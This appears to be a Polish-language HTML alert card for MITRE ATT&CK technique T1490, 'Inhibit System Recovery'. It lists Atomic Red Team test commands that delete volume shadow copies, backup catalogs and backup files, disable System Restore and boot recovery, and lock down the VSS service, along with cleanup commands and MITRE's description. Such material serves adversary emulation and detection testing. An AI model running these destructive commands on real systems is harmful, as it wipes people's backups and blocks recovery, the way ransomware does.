<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Alert: Inhibit System Recovery</title>
  <style>
    body { font-family: Segoe UI, Arial, sans-serif; margin: 2rem; background: #f6f7fb; }
    .card { background: #fff; border-radius: 10px; box-shadow: 0 2px 6px #bbb; padding: 2rem; max-width: 700px; margin: auto; }
    h1 { margin-top: 0; font-size: 2rem; }
    .desc, .id, .link, .author, .tactic, .status { margin-bottom: 1.1em; }
    .meta { font-size: .95em; color: #555; margin-bottom: .8em; }
    .section { font-size: .99em; }
    .scenario-block { background: #f4f0d9; border-radius: 7px; padding: 1em 1.2em; margin-bottom: 1.2em; color:#4a4500; font-size:1.07em; border-left:5px solid #e1c553; }
    pre { background: #eee; padding: .7em 1em; border-radius: 5px; }
    code { background: #f6f6f6; padding: 2px 5px; border-radius: 2px; }
    ul { margin-left: 1.6em; }
  </style>
</head>
<body>
<div class="card">
  <h1>Alert: Inhibit System Recovery</h1>
  <div class="meta"><b>Technique ID:</b> T1490<div style='background:#eaf4ff;border-radius:8px;padding:15px 16px;margin-top:25px;'><b>Atomic Red Team – dostępne testy dla tej techniki:</b><ul><li><b>Windows - Delete Volume Shadow Copies</b><br><b>Polecenia testowe (cmd):</b><pre>vssadmin.exe delete shadows /all /quiet</pre><a href='../../scenarios/atomic_tests\T1490\Windows_-_Delete_Volume_Shadow_Copies/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Windows - Delete Volume Shadow Copies via WMI</b><br><b>Polecenia testowe (cmd):</b><pre>wmic.exe shadowcopy delete</pre><a href='../../scenarios/atomic_tests\T1490\Windows_-_Delete_Volume_Shadow_Copies_vi/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Windows - wbadmin Delete Windows Backup Catalog</b><br><b>Polecenia testowe (cmd):</b><pre>wbadmin delete catalog -quiet</pre><a href='../../scenarios/atomic_tests\T1490\Windows_-_wbadmin_Delete_Windows_Backup_/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Windows - Disable Windows Recovery Console Repair</b><br><b>Polecenia testowe (cmd):</b><pre>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no</pre><a href='../../scenarios/atomic_tests\T1490\Windows_-_Disable_Windows_Recovery_Conso/test_1.cmd'>Pobierz test_1.cmd</a><br><b>Polecenia cleanup (cmd):</b><pre>bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1</pre><a href='../../scenarios/atomic_tests\T1490\Windows_-_Disable_Windows_Recovery_Conso/cleanup_1.cmd'>Pobierz cleanup_1.cmd</a><br></li><li><b>Windows - Delete Volume Shadow Copies via WMI with PowerShell</b><br><b>Polecenia testowe (powershell):</b><pre>Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}</pre><a href='../../scenarios/atomic_tests\T1490\Windows_-_Delete_Volume_Shadow_Copies_vi/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Windows - Delete Backup Files</b><br><b>Polecenia testowe (cmd):</b><pre>del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk</pre><a href='../../scenarios/atomic_tests\T1490\Windows_-_Delete_Backup_Files/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Windows - wbadmin Delete systemstatebackup</b><br><b>Polecenia testowe (cmd):</b><pre>wbadmin delete systemstatebackup -keepVersions:0</pre><a href='../../scenarios/atomic_tests\T1490\Windows_-_wbadmin_Delete_systemstateback/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Windows - Disable the SR scheduled task</b><br><b>Polecenia testowe (cmd):</b><pre>schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable</pre><a href='../../scenarios/atomic_tests\T1490\Windows_-_Disable_the_SR_scheduled_task/test_1.cmd'>Pobierz test_1.cmd</a><br><b>Polecenia cleanup (cmd):</b><pre>schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /enable >nul 2>&1</pre><a href='../../scenarios/atomic_tests\T1490\Windows_-_Disable_the_SR_scheduled_task/cleanup_1.cmd'>Pobierz cleanup_1.cmd</a><br></li><li><b>Disable System Restore Through Registry</b><br><b>Polecenia testowe (cmd):</b><pre>reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f</pre><a href='../../scenarios/atomic_tests\T1490\Disable_System_Restore_Through_Registry/test_1.cmd'>Pobierz test_1.cmd</a><br><b>Polecenia cleanup (cmd):</b><pre>reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /f >nul 2>&1</pre><a href='../../scenarios/atomic_tests\T1490\Disable_System_Restore_Through_Registry/cleanup_1.cmd'>Pobierz cleanup_1.cmd</a><br></li><li><b>Windows - vssadmin Resize Shadowstorage Volume</b><br><b>Polecenia testowe (powershell):</b><pre>vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%</pre><a href='../../scenarios/atomic_tests\T1490\Windows_-_vssadmin_Resize_Shadowstorage_/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Modify VSS Service Permissions</b><br><b>Polecenia testowe (cmd):</b><pre>sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)</pre><a href='../../scenarios/atomic_tests\T1490\Modify_VSS_Service_Permissions/test_1.cmd'>Pobierz test_1.cmd</a><br><b>Polecenia cleanup (cmd):</b><pre>sc sdset VSS D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;LC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)</pre><a href='../../scenarios/atomic_tests\T1490\Modify_VSS_Service_Permissions/cleanup_1.cmd'>Pobierz cleanup_1.cmd</a><br></li></ul><a href='https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1490' target='_blank'>Zobacz wszystkie testy na GitHubie</a></div></div>
  <div class="tactic section"><b>Tactics:</b> <a href="https://attack.mitre.org/tactics/TA0040/" target="_blank">Impact (TA0040)</a></div>
  <div class="status section"><b>Status:</b> Pending</div>
  <div class="scenario-block"><b>Twój opis scenariusza:</b><br>Opis scenariusza, podatności lub techniki.</div>
  <div class="desc section"><b>MITRE Description:</b><br>Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.  Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)  A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:  * <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code> * [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code> * <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code> * <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code> * <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system * <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)  On network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.  On ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to support [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486), preventing them from being leveraged as backups (e.g., via ` vim-cmd vmsvc/snapshot.removeall`).(Citation: Cybereason)  Adversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)</div>
  <div class="link section"><b>MITRE Link:</b> <a href="https://attack.mitre.org/techniques/T1490/" target="_blank">https://attack.mitre.org/techniques/T1490/</a></div>
  <div class="author section"><b>Author:</b> Krzysztof K.</div>
</div>
</body>
</html>
